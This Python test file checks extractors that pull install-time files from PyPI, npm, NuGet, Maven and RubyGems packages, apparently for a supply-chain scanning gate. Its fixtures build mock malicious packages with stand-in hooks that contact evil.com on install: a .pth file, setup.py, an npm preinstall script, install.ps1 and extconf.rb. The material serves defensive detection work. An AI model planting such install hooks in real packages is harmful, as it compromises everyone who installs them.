"""Tests for ecosystem-specific file extractors."""

import json
import io
import os
import tarfile
import tempfile
import zipfile

import pytest

# Add parent to path so extractors can be imported.
import sys
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from extractors.pypi import extract as extract_pypi
from extractors.npm import extract as extract_npm
from extractors.nuget import extract as extract_nuget
from extractors.maven import extract as extract_maven
from extractors.rubygems import extract as extract_rubygems


class TestPyPIExtractor:
    def test_extract_wheel_with_pth_file(self, tmp_path):
        """Test that .pth files are always extracted from wheels."""
        whl_path = tmp_path / "evil-1.0.0.whl"
        with zipfile.ZipFile(whl_path, "w") as zf:
            zf.writestr("evil/__init__.py", "# clean init")
            zf.writestr("evil_init.pth", "import os; os.system('curl evil.com')")
            zf.writestr("evil/METADATA", "Name: evil\nVersion: 1.0.0")
        result = extract_pypi(str(whl_path))
        assert "evil_init.pth" in result
        assert "os.system" in result["evil_init.pth"]

    def test_extract_wheel_with_setup_py(self, tmp_path):
        """Test that setup.py is extracted from wheels."""
        whl_path = tmp_path / "pkg-1.0.0.whl"
        with zipfile.ZipFile(whl_path, "w") as zf:
            zf.writestr("setup.py", "from setuptools import setup; setup()")
            zf.writestr("pkg/__init__.py", "")
        result = extract_pypi(str(whl_path))
        assert "setup.py" in result

    def test_extract_sdist_tar_gz(self, tmp_path):
        """Test extraction from .tar.gz sdist."""
        tar_path = tmp_path / "pkg-1.0.0.tar.gz"
        with tarfile.open(tar_path, "w:gz") as tf:
            content = b"import subprocess; subprocess.call(['curl', 'evil.com'])"
            info = tarfile.TarInfo(name="pkg-1.0.0/setup.py")
            info.size = len(content)
            tf.addfile(info, io.BytesIO(content))
        result = extract_pypi(str(tar_path))
        assert any("setup.py" in k for k in result)

    def test_extract_nonexistent_file(self):
        result = extract_pypi("/nonexistent/path.whl")
        assert result == {}

    def test_extract_empty_wheel(self, tmp_path):
        """Wheel with no interesting files returns empty."""
        whl_path = tmp_path / "clean-1.0.0.whl"
        with zipfile.ZipFile(whl_path, "w") as zf:
            zf.writestr("clean/module.py", "def hello(): pass")
        result = extract_pypi(str(whl_path))
        assert result == {}

    def test_extract_wheel_with_tmp_extension(self, tmp_path):
        """Wheel saved as .tmp should be detected via magic bytes."""
        tmp_file = tmp_path / "shieldoo-gate-pypi-12345.tmp"
        with zipfile.ZipFile(tmp_file, "w") as zf:
            zf.writestr("evil/__init__.py", "# init")
            zf.writestr("evil_init.pth", "import os; os.system('hack')")
        result = extract_pypi(str(tmp_file))
        assert "evil_init.pth" in result

    def test_extract_wheel_with_original_filename(self, tmp_path):
        """When magic bytes fail, original_filename should be used as fallback."""
        # Create a valid zip but with .tmp extension and pass original_filename
        tmp_file = tmp_path / "shieldoo-gate-pypi-99999.tmp"
        with zipfile.ZipFile(tmp_file, "w") as zf:
            zf.writestr("setup.py", "setup()")
        result = extract_pypi(str(tmp_file), original_filename="pkg-1.0.0.whl")
        assert "setup.py" in result

    def test_extract_sdist_with_tmp_extension(self, tmp_path):
        """Sdist saved as .tmp should be detected via magic bytes."""
        tmp_file = tmp_path / "shieldoo-gate-pypi-67890.tmp"
        with tarfile.open(tmp_file, "w:gz") as tf:
            content = b"from setuptools import setup; setup()"
            info = tarfile.TarInfo(name="pkg-1.0.0/setup.py")
            info.size = len(content)
            tf.addfile(info, io.BytesIO(content))
        result = extract_pypi(str(tmp_file))
        assert any("setup.py" in k for k in result)


class TestNPMExtractor:
    def test_extract_package_json_with_preinstall(self, tmp_path):
        """Test extraction of package.json and referenced install scripts."""
        tgz_path = tmp_path / "evil-1.0.0.tgz"
        with tarfile.open(tgz_path, "w:gz") as tf:
            pkg_json = json.dumps({
                "name": "evil",
                "version": "1.0.0",
                "scripts": {"preinstall": "node setup_bun.js"}
            }).encode()
            info = tarfile.TarInfo(name="package/package.json")
            info.size = len(pkg_json)
            tf.addfile(info, io.BytesIO(pkg_json))

            setup_js = b"const http = require('http'); http.get('http://evil.com')"
            info2 = tarfile.TarInfo(name="package/setup_bun.js")
            info2.size = len(setup_js)
            tf.addfile(info2, io.BytesIO(setup_js))

        result = extract_npm(str(tgz_path))
        assert any("package.json" in k for k in result)
        assert any("setup_bun.js" in k for k in result)

    def test_extract_nonexistent_file(self):
        result = extract_npm("/nonexistent/path.tgz")
        assert result == {}


class TestNuGetExtractor:
    def test_extract_install_ps1(self, tmp_path):
        """Test that install.ps1 is extracted from nupkg."""
        nupkg_path = tmp_path / "Evil.1.0.0.nupkg"
        with zipfile.ZipFile(nupkg_path, "w") as zf:
            zf.writestr("tools/install.ps1", "Invoke-WebRequest -Uri 'http://evil.com'")
            zf.writestr("lib/net6.0/Evil.dll", "binary content")
        result = extract_nuget(str(nupkg_path))
        assert "tools/install.ps1" in result

    def test_extract_targets_file(self, tmp_path):
        """Test that .targets files are extracted."""
        nupkg_path = tmp_path / "Build.1.0.0.nupkg"
        with zipfile.ZipFile(nupkg_path, "w") as zf:
            zf.writestr("build/Evil.targets", "<Project><Target Name='Evil'/></Project>")
        result = extract_nuget(str(nupkg_path))
        assert "build/Evil.targets" in result


class TestMavenExtractor:
    def test_extract_pom_from_jar(self, tmp_path):
        """Test pom.xml extraction from JAR."""
        jar_path = tmp_path / "evil-1.0.0.jar"
        with zipfile.ZipFile(jar_path, "w") as zf:
            zf.writestr("META-INF/maven/com.evil/evil/pom.xml",
                         "<project><build><plugins/></build></project>")
            zf.writestr("com/evil/Main.class", "binary")
        result = extract_maven(str(jar_path))
        assert any("pom.xml" in k for k in result)

    def test_extract_pom_file(self, tmp_path):
        """Test direct .pom file extraction."""
        pom_path = tmp_path / "evil-1.0.0.pom"
        pom_path.write_text("<project><build/></project>")
        result = extract_maven(str(pom_path))
        assert len(result) == 1

    def test_extract_jar_with_tmp_extension(self, tmp_path):
        """JAR saved as .tmp should be detected via magic bytes (ZIP)."""
        tmp_file = tmp_path / "shieldoo-gate-maven-12345.tmp"
        with zipfile.ZipFile(tmp_file, "w") as zf:
            zf.writestr("META-INF/maven/com.evil/evil/pom.xml",
                         "<project><build><plugins/></build></project>")
        result = extract_maven(str(tmp_file))
        assert any("pom.xml" in k for k in result)

    def test_extract_pom_with_tmp_extension(self, tmp_path):
        """POM saved as .tmp should be detected via XML content inspection."""
        tmp_file = tmp_path / "shieldoo-gate-maven-67890.tmp"
        tmp_file.write_text("<?xml version='1.0'?><project><build/></project>")
        result = extract_maven(str(tmp_file))
        assert len(result) == 1

    def test_extract_jar_with_original_filename(self, tmp_path):
        """When magic bytes work, original_filename is accepted but not needed."""
        tmp_file = tmp_path / "shieldoo-gate-maven-99999.tmp"
        with zipfile.ZipFile(tmp_file, "w") as zf:
            zf.writestr("META-INF/maven/com.test/test/pom.xml",
                         "<project/>")
        result = extract_maven(str(tmp_file), original_filename="test-1.0.0.jar")
        assert any("pom.xml" in k for k in result)


class TestRubyGemsExtractor:
    def test_extract_extconf_from_gem(self, tmp_path):
        """Test extraction of extconf.rb from a .gem file."""
        gem_path = tmp_path / "evil-1.0.0.gem"

        # Build data.tar.gz in memory.
        data_buf = io.BytesIO()
        with tarfile.open(fileobj=data_buf, mode="w:gz") as data_tar:
            content = b"require 'mkmf'\nsystem('curl evil.com')"
            info = tarfile.TarInfo(name="ext/evil/extconf.rb")
            info.size = len(content)
            data_tar.addfile(info, io.BytesIO(content))
        data_bytes = data_buf.getvalue()

        # Build outer .gem tar.
        with tarfile.open(gem_path, "w") as outer:
            info = tarfile.TarInfo(name="data.tar.gz")
            info.size = len(data_bytes)
            outer.addfile(info, io.BytesIO(data_bytes))

        result = extract_rubygems(str(gem_path))
        assert any("extconf.rb" in k for k in result)
        assert any("curl" in v for v in result.values())
